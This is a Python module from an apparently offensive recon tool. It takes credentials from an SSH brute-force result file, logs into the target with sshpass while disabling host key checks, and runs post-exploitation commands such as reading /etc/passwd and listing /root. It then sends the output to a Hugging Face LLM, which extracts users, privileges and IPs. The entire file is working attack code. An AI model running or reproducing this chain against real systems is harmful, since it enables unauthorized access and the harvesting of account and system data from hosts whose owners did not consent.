import os
import sys
import subprocess
import json
import logging
from datetime import datetime
from huggingface_hub import InferenceClient

sys.path.insert(0, os.path.abspath(os.path.join(os.getcwd(), "tools")))
from llm_logger import PromptLogger

# Logging Setup
logger = logging.getLogger("reconAIssance")
logger.setLevel(logging.DEBUG)
if not logger.hasHandlers():
    log_formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
    file_handler = logging.FileHandler("recon_log.txt", mode='a')
    file_handler.setFormatter(log_formatter)
    logger.addHandler(file_handler)
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(log_formatter)
    logger.addHandler(console_handler)

def get_successful(path):
    p = os.path.join(path, "ssh_brute_result.json")
    if not os.path.exists(p):
        logger.warning("No ssh_brute_result.json found.")
        return []
    try:
        sessions = [r for r in json.load(open(p)) if r.get("success")]
        logger.info(f"Found {len(sessions)} successful SSH credentials.")
        return sessions
    except Exception as e:
        logger.exception("Failed to parse ssh_brute_result.json")
        return []

def run_ssh_cmds(target, user, password, path):
    logger.info(f"Running SSH post-exploitation for: {user}@{target}")
    log_path = os.path.join(path, f"ssh_post_chain_{user}.log")
    try:
        with open(log_path, "w") as f:
            for cmd in ["id", "whoami", "uname -a", "hostname", "ip a", "cat /etc/passwd", "ls -la /root"]:
                full_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {user}@{target} '{cmd}'"
                try:
                    result = subprocess.run(full_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10)
                    out = result.stdout.decode(errors='ignore')
                    f.write(f"\n$ {cmd}\n{out}\n")
                    logger.debug(f"Executed '{cmd}' for {user}@{target}")
                except Exception as e:
                    logger.warning(f"SSH command '{cmd}' failed: {e}")
                    f.write(f"\n$ {cmd}\n[!] Error: {e}\n")
    except Exception as e:
        logger.exception(f"Failed to write SSH output log for {user}")
    return log_path

def analyze(log_path):
    logger.info(f"Analyzing SSH log: {log_path}")
    try:
        token = open("tools/apitoken.txt").read().strip()
    except Exception as e:
        logger.error("Missing tools/apitoken.txt")
        return "[!] Missing API token."

    try:
        with open(log_path) as f:
            output = f.read()
    except Exception as e:
        logger.error(f"Could not read log file: {log_path}")
        return "[!] Could not read SSH log."

    prompt = f"""Analyze this SSH output. List users, groups, IPs, privileges, system info:\n{output[:4000]}"""
    try:
        client = InferenceClient(token)
        logger_llm = PromptLogger()
        response = client.text_generation(prompt, max_new_tokens=500).strip()
        logger_llm.log("sshchain", prompt, response)
        logger.info("LLM analysis completed.")
        return response
    except Exception as e:
        logger.exception("Failed to run LLM inference")
        return "[!] LLM inference failed."

def run(target, path):
    logger.info(f"Starting SSH chain analysis for target: {target}")
    sessions = get_successful(path)
    if not sessions:
        logger.warning("No successful SSH sessions found. Aborting.")
        return

    for s in sessions:
        user = s["user"]
        pw = s["password"]
        log = run_ssh_cmds(target, user, pw, path)
        result = analyze(log)
        out_file = os.path.join(path, f"ssh_ai_summary_{user}.txt")
        try:
            with open(out_file, "w") as f:
                f.write(result)
            logger.info(f"Summary saved: {out_file}")
        except Exception as e:
            logger.exception(f"Failed to write summary for {user}")

if __name__ == "__main__":
    t = os.getenv("RECON_KI_TARGET")
    p = os.getenv("RECON_KI_RUN_PATH")
    if not t or not p:
        logger.error("Missing RECON_KI_TARGET or RECON_KI_RUN_PATH")
        exit(1)
    run(t, p)
